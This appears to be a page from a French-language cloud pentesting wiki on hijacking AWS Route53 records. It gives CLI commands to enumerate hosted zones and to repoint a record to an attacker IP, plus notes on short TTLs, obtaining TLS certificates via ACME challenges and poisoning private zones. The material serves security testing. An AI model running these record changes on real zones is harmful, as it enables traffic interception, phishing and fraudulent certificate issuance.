---
title: "Route53 : détourner des enregistrements et empoisonner la résolution"
order: 3
description: "Détourner les hosted zones et enregistrements Route53 pour capturer des noms, empoisonner la résolution et préparer une prise de contrôle."
keywords:
  - Route53
  - hosted zone
  - DNS record
  - hijack
  - resolution
---

# Route53

Un accès en écriture à une hosted zone Route53 est un accès en écriture à l'endroit où pointent les noms de l'organisation. Avec `route53:ChangeResourceRecordSets`, vous repointez un enregistrement vers une infrastructure que vous contrôlez, ce qui capture le trafic, casse les validations TLS et permet le phishing sur un nom de confiance. Lire les zones fait aussi apparaître des enregistrements dont les cibles n'existent plus, alimentant la [prise de contrôle par DNS orphelin](dangling-dns-takeover.md).

## Énumérer les zones et les enregistrements

```bash
aws route53 list-hosted-zones
aws route53 list-resource-record-sets --hosted-zone-id <zone-id> \
  --query "ResourceRecordSets[].[Name,Type,ResourceRecords[0].Value,AliasTarget.DNSName]"
```

## Repointer un enregistrement

```bash
aws route53 change-resource-record-sets --hosted-zone-id <zone-id> \
  --change-batch '{"Changes":[{"Action":"UPSERT","ResourceRecordSet":{
    "Name":"app.example.com","Type":"A","TTL":60,
    "ResourceRecords":[{"Value":"<attacker-ip>"}]}}]}'
```

## Notes d'exploitation

- Un TTL court fait prendre effet le détournement rapidement et le rend facile à annuler, ce qui convient à une capture limitée dans le temps.
- Repointer un nom validé par ACME vous permet de passer un challenge HTTP-01 ou DNS-01 et de générer un certificat valide pour ce nom.
- Les private hosted zones orientent la résolution à l'intérieur d'un VPC ; en empoisonner une redirige les clients internes sans toucher au DNS public.

## Outils

- **AWS CLI** (`route53 ...`) : énumération de zones et modifications d'enregistrements.
- **ScoutSuite** / **Prowler** : inventaire des hosted zones et des cibles d'alias.

## Références

- [HackTricks Cloud : AWS Route53](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-route53-enum.html)
- [AWS : ChangeResourceRecordSets](https://docs.aws.amazon.com/Route53/latest/APIReference/API_ChangeResourceRecordSets.html)
- [can-i-take-over-xyz : empreintes de prise de contrôle d'enregistrement orphelin](https://github.com/EdOverflow/can-i-take-over-xyz)
- [Hacking the Cloud : techniques offensives AWS](https://hackingthe.cloud/)
